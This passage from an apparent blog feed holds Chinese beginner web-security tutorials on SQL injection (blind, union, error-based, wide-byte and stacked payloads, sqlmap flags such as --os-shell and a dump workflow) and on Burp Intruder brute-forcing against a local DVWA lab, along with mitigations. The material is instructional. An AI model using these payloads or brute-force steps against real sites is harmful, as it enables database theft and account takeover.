class="sql">http:/127.0.0.1/2/sql2.php?name=admin&#39;select user_id,user from users where last_name=&#39;admin&#39;&#39;;</code></pre><p>（2）参数后加’and ‘1’=’1,访问正常。布尔型盲注</p><pre><code class="sql">http:/127.0.0.1/2/sql2.php?name=admin&#39;and &#39;1&#39;=&#39;1select user_id,user from users where last_name=&#39;admin&#39;and &#39;1&#39;=&#39;1&#39;;</code></pre><p>（3）参数后加’and’1’=’2，访问异常。布尔型盲注</p><pre><code class="sql">http:/127.0.0.1/2/sql2.php?name=admin&#39;and&#39;1&#39;=&#39;2select user_id,user from users where last_name=&#39;admin&#39;and &#39;1&#39;=&#39;2&#39;;</code></pre><p>（4）参数后加’and sleep(3)–  3秒后打开。时间盲注</p><pre><code class="sql">http:/127.0.0.1/2/sql2.php?name=admin&#39;and/or sleep(3)--select user_id,user from users where last_name=&#39;admin&#39;and sleep(3)--&#39;;</code></pre><p><strong>PS：</strong></p><p><strong>字符型与数字型注入的主要区别是字符型注入需要通过单引号闭合来进行查询，有时还须通过注释屏蔽后续语句。</strong></p><p><strong>无论数字型还是字符型，满足上述条件时可基本判断存在注入漏洞，但不满足上述条件并不能证明漏洞不存在。</strong></p><h3 id="联合查询注入原理"><a href="#联合查询注入原理" class="headerlink" title="联合查询注入原理"></a>联合查询注入原理</h3><h4 id="SQL的union查询"><a href="#SQL的union查询" class="headerlink" title="SQL的union查询"></a>SQL的union查询</h4><p>（1）SQL中union操作符用于合并两个或多个select语句的结果集。union内部的select语句必须拥有相同数量的列。列也必须拥有相似的数据类型，结果会去掉重复的记录。</p><p>（2）当union之前的select语句结果集为空时，查询结果将由union后的select语句控制。当web应用存在sql注入时，巧妙使用union查询可以进行数据的盗取。</p><p>（3）联合查询注入语句构造步骤：</p><p><img src="https://i.loli.net/2020/12/28/MQNeAl5zXHIYdtE.png" alt="image-20201228182925539"></p><h4 id="union-select语法"><a href="#union-select语法" class="headerlink" title="union select语法"></a>union select语法</h4><p>（1）使用union查询两张表中的数据记录，返回结果时会去掉重复记录。例如：</p><p><img src="https://i.loli.net/2020/12/28/gGpYviTeQXzbd2f.png" alt="image-20201228183401548"></p><pre><code class="sql">select aid,title from article union select bid,title from blog</code></pre><p><img src="https://i.loli.net/2020/12/28/oKbsvpuWBnHRUyQ.png" alt="image-20201228183520085"></p><p>（2）union查询结果说明：</p><p>重复记录是指查询中各个字段完全重复的记录，如上例，若title一样，但id号不一样则算作不同记录</p><p>在<strong>第一个</strong>select语句中被使用的字段名称也被用于结果的字段名称，如上例的aid</p><p>各select语句字段名称可以不同，但<strong>字段属性必须一致，且数目相同</strong></p><p>（3）union select语法用于合并两个或多个select语句的结果集。union内部的select语句必须拥有<strong>相同数量的列，因此判断原有查询语句的列数是构造SQL注入的第一步</strong></p><h4 id="判断原有查询语句的列数"><a href="#判断原有查询语句的列数" class="headerlink" title="判断原有查询语句的列数"></a>判断原有查询语句的列数</h4><p>（1）判断原有查询语句的列数通常基于布尔型盲注的思想来进行，通常使用order by语句来进行。</p><p>（2）<strong>ORDER BY语句用于对结果集进行排序</strong>，在select语句的末尾增加order by N 表示基于第N列进行排序；例如</p><pre><code class="sql">select Company,OrderNumber from Orders order by 1</code></pre><p><img src="https://i.loli.net/2020/12/28/HAqva4PjCiEwW3T.png" alt="image-20201228185004986"></p><p>（3）<strong>当N大于结果集的实际列数时，SQL语句会执行出错，此时SQL语句无法查询到数据，将导致页面显示异常；</strong>因此可以使用ORDER BY语句进行测试，通过逐一增加N的值，当页面显示异常时，可推测出结果集实际列数为N-1;</p><p>（4）通常查询语句的结果集并不会被全部输出到页面上，因此需要知道哪些列可以被输出，此时可以使用select语句的特殊用法来进行判断，在此之前要先保证原有的select语句查询结果为空。</p><p><strong>使原有查询结果为空的方法：</strong></p><p>a.数字型参数可以尝试将值设为0或负数或超大数。</p><p>b.字符型参数可以尝试将值设为空或超长字符串。</p><h4 id="判断数据输出位置"><a href="#判断数据输出位置" class="headerlink" title="判断数据输出位置"></a>判断数据输出位置</h4><p>（1）SELECT语句的特殊用法：当select关键字后跟随的字段名为数字时，结果集也将是对应的数字，如</p><p><img src="https://i.loli.net/2020/12/28/o4fQgRXVMNLWFOv.png" alt="image-20201228190302526"></p><p>（2）基于此用法，当知道原有查询语句的结果集列数时，就可以通过构造特殊的SQL联合查询语句得知查询结果集对应列在页面输出的位置，如：</p><p><img src="https://i.loli.net/2020/12/28/R4hBCy5YnQNK1op.png" alt="image-20201228190452066"></p><h4 id="构造数据提取语句"><a href="#构造数据提取语句" class="headerlink" title="构造数据提取语句"></a>构造数据提取语句</h4><p>在判断出输出位置后，将数据的输出位置替换为要查询的内容，即可通过联合查询的方式提取目标数据，被替换的位置可以是函数、字段名或另一个查询语句。</p><p><img src="https://i.loli.net/2020/12/28/GDgI2QenLcJzxmE.png" alt="image-20201228190845417"></p><p><img src="https://i.loli.net/2020/12/28/UKfi4sC7QVxWuad.png" alt="image-20201228192051553"></p><h4 id="构造显示的数据条目"><a href="#构造显示的数据条目" class="headerlink" title="构造显示的数据条目"></a>构造显示的数据条目</h4><p>（1）有时web应用并不会将SQL查询的所有结果集显示出来，如只显示结果集的第一条记录，这时就需要调整输出结果。在mysql中，可以使用limit语句实现。</p><p><strong>LIMIT子句可以被用于强制SELECT语句返回指定的记录数</strong></p><p>（2）LIMIT接收一个或两个数字参数。参数必须是一个整数常量。如果给定两个参数，第一个参数指定第一个返回记录行的偏移量，第二个参数指定返回记录行的最大数目。</p><p><strong>注意：初始记录行的偏移量是0而不是1</strong></p><p>（3）<strong>LIMIT语法：</strong></p><pre><code class="sql">select * from table LIMIT[offset,] rows | rows OFFSET offset</code></pre><p>（4）LIMIT例句：</p><pre><code class="sql">select * from table LIMIT 5       //检索前5个记录行select * from table LIMIT 5,10    //检索记录行6-15select * from table LIMIT 95，-1  //检索记录行96之后的所有数据</code></pre><p><img src="https://i.loli.net/2020/12/28/j1z5JDoWKX8QIYh.png" alt="image-20201228193220778"></p><h4 id="联合查询注入过程总结"><a href="#联合查询注入过程总结" class="headerlink" title="联合查询注入过程总结"></a>联合查询注入过程总结</h4><p>（1）判断原有查询语句的列数</p><pre><code class="sql">select company,ordermumber from orders order by 1</code></pre><p>（2）使原有查询语句的结果为空</p><pre><code>http://localhost/sqleasy/news.php?newsid=0</code></pre><p>（3）判断数据输出位置：</p><pre><code>http://localhost/sqleasy/news.php?newsid=0 union select 1,2,3,4</code></pre><p>（4）使用union语句拼接目标数据的查询语句</p><pre><code class="sql">select * from persons where id=1 union select username,password,3,4,5,6 from admin</code></pre><h3 id="报错注入的基本原理"><a href="#报错注入的基本原理" class="headerlink" title="报错注入的基本原理"></a>报错注入的基本原理</h3><p>如果web应用把sql注入的报错信息返回到客户端，那么可以通过构造特殊的错误语句并通过返回的错误信息盗取数据。</p><p><img src="https://i.loli.net/2020/12/28/QDLTgZqOvowe1A8.png" alt="image-20201228195018164"></p><h3 id="数据提取方式"><a href="#数据提取方式" class="headerlink" title="数据提取方式"></a>数据提取方式</h3><table><thead><tr><th align="center">联合查询</th><th align="center">报错注入</th><th align="center">布尔型盲注</th><th align="center">时间盲注</th></tr></thead><tbody><tr><td align="center">构造联合查询语句将目标数据直接查询出来并显示在页面上</td><td align="center">构造错误的SQL语句，并将目标数据在报错信息中直接显示</td><td align="center">构造特殊的SQL语句对目标数据进行猜测，使得猜测正确时与猜测错误时页面回显内容不同</td><td align="center">构造特殊的SQL语句对目标数据进行猜测，使得猜测正确时与猜测错误时页面响应时间不同</td></tr><tr><td align="center">目标数据直接在页面显示内容中提取</td><td align="center">必须在网站回显原始报错数据的情况下使用，目标数据在报错信息中提取</td><td align="center">根据页面显示结果推断目标数据内容</td><td align="center">根据页面响应时间推断目标数据内容</td></tr></tbody></table><h2 id="SQL注入漏洞的利用"><a href="#SQL注入漏洞的利用" class="headerlink" title="SQL注入漏洞的利用"></a>SQL注入漏洞的利用</h2><h3 id="SQLmap"><a href="#SQLmap" class="headerlink" title="SQLmap"></a>SQLmap</h3><p>SQLmap 是一个开放源码的渗透测试工具，它可以自动探测和利用SQL注入漏洞来接管数据库服务器。它配备了一个强大的探测引擎，为最终渗透测试人员提供很多强大的功能，可以拖库，可以访问底层的文件系统，还可以通过带外连接执行操作系统上的命令。</p><p>下载地址：<a href="https://github.com/sqlmapproject/sqlmap/">https://github.com/sqlmapproject/sqlmap/</a></p><p>官网地址：<a href="http://sqlmap.org/">http://sqlmap.org/</a></p><p>Linux有自带这个工具</p><h3 id="SQLmap的常见参数使用"><a href="#SQLmap的常见参数使用" class="headerlink" title="SQLmap的常见参数使用"></a>SQLmap的常见参数使用</h3><p>–version     #显示程序的版本号并退出 </p><p>-h, –help     #显示此帮助消息并退出</p><p>-u           #设置目标URL</p><p>-p           #指定测试参数</p><p>-D           #指定要进行枚举的数据库名</p><p>-T           #指定要进行枚举的数据库表</p><p>-C           #指定要进行枚举的数据库列</p><p>-U           #指定要进行枚举的数据库用户</p><p>–current-user    #获取当前用户名称</p><p>–current-db    #获取当前数据库名称</p><p>–cookie        #设置cookie值</p><p>–dbs          #列出数据库</p><p>–tables        #列出数据库中的表</p><p>–columns        #列出表中的列</p><p>–dump            #列出表中的字段</p><p>–sql-shell        #执行SQL命令</p><p>–os-cmd        #执行系统命令</p><p>–os-shell        #与系统交互shell</p><p>-r              #加载外部请求包</p><p>–data=DATA        #通过POST发送数据字符串</p><p>–level=LEVEL    #执行测试的等级(1-5,默认为1）</p><p>–risk=RISK        #执行测试的风险(0-3,默认为1）</p><p> -v VERBOSE        #详细级别：0-6（默认为1）</p><p>–proxy=PROXY    #使用HTTP代理连接到目标URL</p><p>–user-agent    #指定HTTP User-Agent</p><p>–tamper=TAMPER    #使用给定的脚本(S)篡改注入数据</p><h3 id="基本的注入流程"><a href="#基本的注入流程" class="headerlink" title="基本的注入流程"></a>基本的注入流程</h3><p>①　判断注入点和数据类型：</p><p>GET方法注入：sqlmap -u <a href="http://www.test.php/?id=1">http://www.test.php?id=1</a></p><p>POST注入：sqlmap -r /etc/url.txt（使用burpsuite等代理工具拦截POST请求内容，将POST请求内容保存在一个文本文件中，此处为url.txt，并用sqlmap调用）</p><p>②　判断数据库名（dbs）：sqlmap -u “<a href="http://www.test.php/?id=1%E2%80%9D">http://www.test.php?id=1”</a> –dbs </p><p>③　判断表名（tables）：sqlmap -u “<a href="http://www.test.php/?id=1%E2%80%9D">http://www.test.php?id=1”</a> -D 数据库名 –tables</p><p>④　判断列名（columns）：sqlmap -u “<a href="http://www.test.php/?id=1%E2%80%9D">http://www.test.php?id=1”</a> -D 数据库名 -T 表名 –column</p><p>⑤　获取字段：sqlmap -u “<a href="http://www.test.php/?id=1%E2%80%9D">http://www.test.php?id=1”</a> -D 数据库名 -T 表名 -C 列名 –dump</p><p>查看获取的数据文件：</p><p>windows：C:\Users\Administrator.sqlmap\output</p><p>Kali linux： /root/.sqlmap/output</p><h2 id="SQL注入漏洞的防范"><a href="#SQL注入漏洞的防范" class="headerlink" title="SQL注入漏洞的防范"></a>SQL注入漏洞的防范</h2><p>1．过滤：</p><p>通过对SQL关键字和关键符号的过滤来避免SQL注入漏洞的发生</p><p>优点：业务改动量小，部署方便，是安全防护软件/硬件常用的解决方案</p><p>缺点：基于黑名单的工作原理，容易产生误报或被绕过</p><p>2．编码：</p><p>基于各类数据库定义的关键字和符号的转义规则将用户输入进行转义后组成SQL语句</p><p>优点：不影响正常请求且不容易被绕过，OWASP ESAPI项目提供了这种解决方案</p><p>缺点：整改需要一定的工作量，需要数据库自身的支持，且理论上仍存在的绕过风险</p><p>3．预编译：</p><p>基于各种语言的预编译功能，先将SQL语句进行编译，用户输入的内容只会被当做参数传入，不会被编译为命令</p><p>优点：从根本上杜绝了SQL发生的可能性</p><p>缺点：业务改动量大，建议新开发的项目均采用此种方式避免SQL注入攻击的产生。</p><h3 id="扩展：宽字节注入、堆叠注入"><a href="#扩展：宽字节注入、堆叠注入" class="headerlink" title="扩展：宽字节注入、堆叠注入"></a>扩展：宽字节注入、堆叠注入</h3><p>当魔术引导开启后，会在输入的单号前加上转义字符\，这时可可使用宽字节注入：</p><pre><code>%df&#39;</code></pre><p>php使用mysqli_multi_query()查询方式，可堆叠注入：注释后面的内容，也可绕过验证，成功登录</p><pre><code>admin&#39; #</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 安全初级 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEB安全基础(二)</title>
      <link href="2020/12/26/%E5%AE%89%E5%85%A8%E5%88%9D%E7%BA%A7/WEB%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80(%E4%BA%8C)/"/>
      <url>2020/12/26/%E5%AE%89%E5%85%A8%E5%88%9D%E7%BA%A7/WEB%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80(%E4%BA%8C)/</url>
      
        <content type="html"><![CDATA[<h2 id="服务端脚本基础"><a href="#服务端脚本基础" class="headerlink" title="服务端脚本基础"></a>服务端脚本基础</h2><h3 id="静态网页与动态网页"><a href="#静态网页与动态网页" class="headerlink" title="静态网页与动态网页"></a>静态网页与动态网页</h3><p>（1）静态页面，即静态网页，是实际存在的，无需经过服务器的编译，直接加载到客户浏览器上显示出来。静态页面需要占一定的服务器空间，且不能自主管理发布更新的页面。</p><p>（2）动态页面则是以ASP、ASPX、PHP、JSP等，由相应的脚本引擎来解释执行，根据指令生成静态网页。</p><p>​          动态页面上的内容存在于数据库中，根据用户发出的不同请求，其提供个性化的网页内容。</p><p>​          动态页面内容不是存在于页面上，而是存在数据库中，从而大大降低网站的维护工作量。</p><p>​          采用动态网页技术的网站可以实现更多的功能，如用户注册、用户登录、在线调查、用户管理、订单管理等等；静态页面则无法实现这些功能。</p><p>（3）动态页面与静态页面的区别：</p><p>静态页面：html或htm，是一种静态的页面格式，不需要服务器解析其中的脚本，由浏览器解析。</p><p>动态页面：由相应的脚本引擎来解释执行，根据指令生成静态网页，如PHP、JSP、ASPX等。</p><table><thead><tr><th align="center">静态网页</th><th align="center">动态网页</th></tr></thead><tbody><tr><td align="center">不依赖数据库</td><td align="center">依赖数据库</td></tr><tr><td align="center">灵活性差，制作、更新、维护麻烦</td><td align="center">灵活性好，维护简单</td></tr><tr><td align="center">在功能方面有较大的限制，交互性能差</td><td align="center">交互性好，功能强大</td></tr><tr><td align="center">服务端不处理用户输入，安全性高</td><td align="center">服务端需要处理用户输入，安全性低</td></tr></tbody></table><p>直接的区别是动态页面访问相同的页面，客户端获得的源代码可能不同。</p><h3 id="常见的服务端脚本语言"><a href="#常见的服务端脚本语言" class="headerlink" title="常见的服务端脚本语言"></a>常见的服务端脚本语言</h3><p>（1）ASP：是动态服务器页面(Active Server Pages)的英文缩写，也称为经典ASP，动态产生Web页面。</p><p>（2）ASPX：aspx文件是微软的在服务器端运行的动态网页文件,属于ASP.NET技术。ASP.NET是由微软在·NET Framework框架中所提供，开发Web应用程序的类库，封装在System.Web.dll文件中，显露出System.Web命名空间，并提供ASP.NET网页处理、扩充以及HTTP通道的应用程序与通信处理等工作，以及Web Service的基础架构。ASP.NET是ASP技术的后继者，但它的发展性要比ASP技术强大许多</p><p>（3）JSP：全名为Java Server Pages，中文名叫java服务器页面，其根本是一个简化的Servle设计。</p><p>（4）PHP(Hypertext Preprocessor超文本预处理器)是一种通用开源脚本语言，语法吸收了C语言、Java和Perl的特点，利于学习，使用广泛，主要适用于Web开发领域。PHP独特的语法混合了C、Java、Perl以及PHP自创的语法。它可以比CGl或者Perl更快速地执行动态网页。</p><h3 id="PHP语法基础"><a href="#PHP语法基础" class="headerlink" title="PHP语法基础"></a>PHP语法基础</h3><p>（1）PHP文件的默认文件扩展名是”.php”</p><p>（2）PHP脚本可以放置于文档中的任何位置</p><p>（3）PHP文件通常包含HTML标签以及一些PHP脚本代码</p><p>（4）PHP脚本以&lt;?php开头，以?&gt;结尾</p><p>（5）PHP语句以分号结尾(;)</p><p>（6）PHP使用//作为注释符号</p><pre><code class="php">&lt;?php    //此处是PHP代码    ?&gt;</code></pre><h3 id="PHP输出"><a href="#PHP输出" class="headerlink" title="PHP输出"></a>PHP输出</h3><p>（1）echo能够输出一个以上的字符串</p><p>（2）echo是一个语言结构，有无括号均可使用：echo或echo()</p><p>（3）实例：用echo命令来显示不同的字符串(注意：字符串中能包含HTML标记)</p><pre><code class="php">&lt;?phpecho &quot;&lt;h2&gt;PHP很有趣!&lt;/h2&gt;&quot;;echo &quot;Hello world!&lt;br&gt;&quot;;echo &quot;我计划学习PHP! &lt;br&gt;&quot;;echo &quot;这段话&quot;,&quot;由&quot;,&quot;多个&quot;,&quot;字符串&quot;,&quot;串接而成。&quot;;?&gt;</code></pre><p><img src="https://i.loli.net/2020/12/26/PqLGshoaFpf8Vc4.png" alt="image-20201226220748663"></p><h3 id="PHP与HTML结合"><a href="#PHP与HTML结合" class="headerlink" title="PHP与HTML结合"></a>PHP与HTML结合</h3><pre><code class="php">&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;body&gt;     &lt;h1&gt;我的第一张PHP页面&lt;/h1&gt;&lt;?php echo &quot;Hello World!&quot;; ?&gt; &lt;/body&gt; &lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2020/12/26/4bSYiJCj9IGBHms.png" alt="image-20201226221946820"></p><h3 id="PHP的表单处理"><a href="#PHP的表单处理" class="headerlink" title="PHP的表单处理"></a>PHP的表单处理</h3><h4 id="在HTML上触发GET请求"><a href="#在HTML上触发GET请求" class="headerlink" title="在HTML上触发GET请求"></a>在HTML上触发GET请求</h4><p>（1）HTML可以采用A标签或form表单的形式触发get请求，从带有get方法的表单发送的信息会显示在浏览器的地址栏，并且对发送信息的量也有限制。使用A标签触发get请求时，请求的参数值是固定的。</p><pre><code class="HTML">&lt;!--a标签触发get请求--&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;utf-8&quot;&gt;        &lt;title&gt;GET请求&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;a href= &quot;get.php?fname=dayang&amp;age=24&quot;&gt;提交请求&lt;/a&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2020/12/26/l2r7OuaxcVoyLjT.png" alt="image-20201226223120376"></p><p><img src="https://i.loli.net/2020/12/26/EHOnCwqbfkh8FpT.png" alt="image-20201226223157764"></p><p>（2）form表单触发GET请求</p><pre><code class="html">&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;urf-8&quot;&gt;        &lt;title&gt;GET请求&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;!--请求目标页面为get.php,请求方式为get--&gt;         &lt;form action=&quot;get.php&quot; method=&quot;get&quot;&gt;                         名字:&lt;input type=&quot;text&quot; name=&quot;fname&quot;&gt;            年龄:&lt;input type=&quot;text&quot; name=&quot;age&quot;&gt;            &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;        &lt;/form&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2020/12/26/qgwT4RVxsoBFXfS.png" alt="image-20201226225025070"></p><h4 id="GET请求的处理"><a href="#GET请求的处理" class="headerlink" title="GET请求的处理"></a>GET请求的处理</h4><p>$_GET变量用于收集HTTP GET请求中的参数值。服务端处理</p><pre><code class="php">欢迎&lt;?php echo $_GET[&quot;fname&quot;];?&gt;!&lt;br&gt;你的年龄是&lt;?php echo $_GET[&quot;age&quot;];?&gt;岁。</code></pre><p><img src="https://i.loli.net/2020/12/26/4sZ7hPrbRnqTIva.png" alt="image-20201226231005000"></p><h4 id="在HTML上触发POST请求"><a href="#在HTML上触发POST请求" class="headerlink" title="在HTML上触发POST请求"></a>在HTML上触发POST请求</h4><p>（1）HTML可以采用form表单的形式触发POST请求，从带有POST方法的表单发送的数据，不会显示在浏览器的地址栏，并且对发送信息的量也没有限制，常用于传输敏感数据或较大量的数据。</p><p>（2）实例：form表单触发POST请求</p><pre><code class="html">&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;utf-8&quot;&gt;        &lt;title&gt;POST请求&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;form action=&quot;post.php&quot; method=&quot;post&quot;&gt;            名字:&lt;input type=&quot;text&quot; name=&quot;fname&quot;&gt;            年龄:&lt;input type=&quot;text&quot; name=&quot;age&quot;&gt;            &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;        &lt;/form&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><h4 id="POST请求的处理"><a href="#POST请求的处理" class="headerlink" title="POST请求的处理"></a>POST请求的处理</h4><p>$_POST变量用于收集来自HTTP POST请求中的参数值</p><pre><code class="php">欢迎&lt;?php echo $_POST[&quot;fname&quot;];?&gt;!&lt;br&gt;你的年龄是&lt;?php echo $_POST[&quot;age&quot;];?&gt;岁。</code></pre><h2 id="数据库与SQL基础"><a href="#数据库与SQL基础" class="headerlink" title="数据库与SQL基础"></a>数据库与SQL基础</h2><h3 id="数据库系统基本概念"><a href="#数据库系统基本概念" class="headerlink" title="数据库系统基本概念"></a>数据库系统基本概念</h3><p>（1）数据库：长期存储在计算机内、有组织的、可共享的数据集合</p><p>（2）DBMS(DataBase Management Ssytem):一种操纵和管理数据库的大型软件，用于建立、使用和维护数据库，它对数据库进行统一的管理和控制，以保证数据库的安全性和完整性。常见的DBMS包括access、sqlserver、mysql、oracle、DB2等。</p><h3 id="关系型数据库系统特点"><a href="#关系型数据库系统特点" class="headerlink" title="关系型数据库系统特点"></a>关系型数据库系统特点</h3><p>（1）数据结构化和共享性：库、表、字段；结构化查询(SQL)</p><p>（2）数据独立性：物理独立性，逻辑独立性</p><p>（3）数据的完整性约束：</p><p>实体完整性(通过主键约束条件)</p><p>参照完整性(通过主外键约束条件)</p><p>用户自定义完整性(通过CHECK子句)</p><p>（4）数据由DBMS统一管理和控制：查询引擎、事务控制、数据存储模块/组件</p><p><img src="https://i.loli.net/2020/12/26/1bK2sX6JWvpFoCQ.png" alt="image-20201226234112089"></p><h3 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h3><p>（1）概念：SQL语言，是结构化查询语言(Structured Query Language)的简称。SQL语言是一种数据库查询和程序设计语言，用于存储数据以及查询、更新和管理关系数据库系统；同时也是数据库脚本文件的扩展名。</p><p>（2）SQL语句格式：在数据库上执行的大部分工作都由SQL语句完成。注意：SQL对大小写不敏感。#和– 后的内容代表注释，在浏览器中–要写为–+</p><p><img src="https://i.loli.net/2020/12/26/p6QNkLcKsZrwg5i.png" alt="image-20201226234657011"></p><h4 id="SELECT语句——基本查询"><a href="#SELECT语句——基本查询" class="headerlink" title="SELECT语句——基本查询"></a>SELECT语句——基本查询</h4><p>（1）cmd进入mysql数据库，前提是设置好环境变量在PATH里面添加D:\SecurityTools\WebTools\phpstudy\PHPTutorial\MySQL\bin</p><p>然后运行cmd命令窗口，输入：mysql -u root -p，回车后输入密码即可进入数据库。</p><p>或者直接用phpstudy打开：其他选项菜单–&gt;MySQL工具–&gt;MySQL命令行</p><p>（2）基本查询：</p><pre><code>show databases;      //查询数据库有哪些use mysql;           //进入或使用mysql数据库  show tables;         //查询mysql数据库中的表</code></pre><p><img src="https://i.loli.net/2020/12/27/WUZ3eGvINQJCnlT.png" alt="image-20201227001655078"></p><h4 id="SELECT语句——AND和OR运算"><a href="#SELECT语句——AND和OR运算" class="headerlink" title="SELECT语句——AND和OR运算"></a>SELECT语句——AND和OR运算</h4><p>（1）AND运算：AND分隔的表达式须同时满足</p><p>（2）OR运算：OR分隔的表达式只需要满足任意一个</p><p><img src="https://i.loli.net/2020/12/27/M9dc7NvyPGBaUbg.png" alt="image-20201227002419442"></p><p><img src="https://i.loli.net/2020/12/27/onBa1mAVIOLfM85.png" alt="image-20201227002127380"></p><p>（3）当AND和OR运算符同时出现时，先进行AND运算，再进行OR运算。优先级=大于and大于or</p><p><img src="https://i.loli.net/2020/12/27/PxGFUetMfmglOI4.png" alt="image-20201227002245210"></p><h2 id="动态页面的工作原理"><a href="#动态页面的工作原理" class="headerlink" title="动态页面的工作原理"></a>动态页面的工作原理</h2><h3 id="动态页面工作流程理解——数据查询"><a href="#动态页面工作流程理解——数据查询" class="headerlink" title="动态页面工作流程理解——数据查询"></a>动态页面工作流程理解——数据查询</h3><p><img src="https://i.loli.net/2020/12/27/9bBDrMq2fA3JXKh.png" alt="image-20201227002758895"></p><p><img src="https://i.loli.net/2020/12/27/SFuhmXac5DQ48E2.png" alt="image-20201227002850094"></p><h4 id="系统登录成功"><a href="#系统登录成功" class="headerlink" title="系统登录成功"></a>系统登录成功</h4><p><img src="https://i.loli.net/2020/12/27/2F3X5vh1WozLGVT.png" alt="image-20201227003308006"></p><h4 id="系统登录失败"><a href="#系统登录失败" class="headerlink" title="系统登录失败"></a>系统登录失败</h4><p><img src="https://i.loli.net/2020/12/27/WgMJ64cFa8hvl5B.png" alt="image-20201227003345200"></p><h3 id="动态网站搭建——DVWA"><a href="#动态网站搭建——DVWA" class="headerlink" title="动态网站搭建——DVWA"></a>动态网站搭建——DVWA</h3><p>（1）首先将DVWA的源代码放进D:\SecurityTools\WebTools\phpstudy\PHPTutorial\WWW中，然后解压DVWA的压缩包。</p><p>（2）配置DVWA链接数据库，打开config文件夹，打开config.inc.php。(注意需要将文件类型改为php)</p><p>（3）需要把db_password修改成root，因为刚安装好的集成环境默认的MySQL连接用户名和密码为root和root。</p><p><img src="https://i.loli.net/2020/12/27/gsv5e4f6WkrwUTN.png" alt="image-20201227004006196"></p><p>（4）登录DVWA，在浏览器地址栏输入127.0.0.1/DVWA/index.php访问</p><p>（5）点击Create/Reset Database后，再次访问。登录初始账号admin，密码password</p><p><img src="https://i.loli.net/2020/12/27/JYNCheTFMkK2wzi.png" alt="image-20201227005759025"></p><p><img src="https://i.loli.net/2020/12/27/N8xrA5q2wlM3eK6.png" alt="image-20201227005235895"></p><h2 id="Burp暴力破解"><a href="#Burp暴力破解" class="headerlink" title="Burp暴力破解"></a>Burp暴力破解</h2><p>暴力破解一般指穷举法，穷举法的基本思想是根据题目的部分条件确定答案的大致范围，并在此范围内对所有可能的情况逐一验证，直到全部情况验证完毕。若某个情况验证符合题目的全部条件，则为本问题的一个解；若全部情况验证后都不符合题目的全部条件，则本题无解。穷举法也称枚举法。</p><h3 id="Burpsuite模块——Intruder模块详解"><a href="#Burpsuite模块——Intruder模块详解" class="headerlink" title="Burpsuite模块——Intruder模块详解"></a>Burpsuite模块——Intruder模块详解</h3><p>（1）Burp Intruder用于自动对Web应用程序自定义的攻击</p><p>（2）Burp Intruder是高度可配置的，并被用来广范围内进行自动化攻击。可以枚举标识符，获取有用数据，漏洞模糊测试。</p><p>（3）合适的攻击类型取决于应用程序的情况，可能包括：</p><p>缺陷测试：SQL注入，跨站点脚本攻击，缓冲区溢出，路径遍历，暴力攻击认证系统，枚举，操纵参数，拖出隐藏的内容和功能，会话令牌测序和会话劫持，数据挖掘，并发攻击，应用层的拒绝服务式攻击。</p><h4 id="模块说明"><a href="#模块说明" class="headerlink" title="模块说明"></a>模块说明</h4><p>（1）Target用于配置目标服务器进行攻击的详细信息</p><p><img src="https://i.loli.net/2020/12/27/pvnqcXkR5i3WDsU.png" alt="image-20201227010741048"></p><p>（2）Positions设置Payloads的插入点以及攻击类型(攻击模式)</p><p>攻击模式：</p><p>sniper：单个字典，单个变量，若有多个变量，对变量依次进行破解。多个标记依次进行。</p><p>Battering ram：多个变量设置一个字典，对变量同时进行破解。多个标记同时进行。</p><p>Pitchfork：每一个变量标记对应一个字典，取每个字典对应项。</p><p>Cluster bomb：每个变量对应一个字典，并且进行交集破解，尝试各种组合。适合用于用户名+密码的破解。</p><p><img src="https://i.loli.net/2020/12/27/PjUBe1bpnXo6wiE.png" alt="image-20201227011237538"></p><p>（3）Payloads设置payload，配置字典</p><p><img src="https://i.loli.net/2020/12/27/h3VcGn6eXlEgOUt.png" alt="image-20201227011344398"></p><h4 id="暴力破解——DVWA"><a href="#暴力破解——DVWA" class="headerlink" title="暴力破解——DVWA"></a>暴力破解——DVWA</h4><p>（1）访问DVWA的地址，点击Brute Force</p><p><img src="https://i.loli.net/2020/12/27/uZomrbMh7LBjIdY.png" alt="image-20201227011547962"></p><p>（2）随便输入用户名，密码，浏览器开启代理后，用burp抓包</p><p>（3）将抓到的包发送到Intruder模块</p><p>（4）设置好目标端口，攻击方式选择Cluster bomb</p><p><img src="https://i.loli.net/2020/12/27/HEwQZUdjAmqLbih.png" alt="image-20201227011758916"></p><p>（5）删除$之后，进入payloads模块，添加密码本，也就是要进行暴力破解时依次验证的每个密码。</p><p>（6）全部设置完后，点击star attck 开始攻击</p><p>（7）在弹出的框中，寻找与其他长度不符合的payload，该payload就是最终破解出来的密码，可以点击”length”排序后快速查找。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 安全初级 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEB安全基础(一)</title>
      <link href="2020/12/15/%E5%AE%89%E5%85%A8%E5%88%9D%E7%BA%A7/WEB%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80(%E4%B8%80)/"/>
      <url>2020/12/15/%E5%AE%89%E5%85%A8%E5%88%9D%E7%BA%A7/WEB%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80(%E4%B8%80)/</url>
      
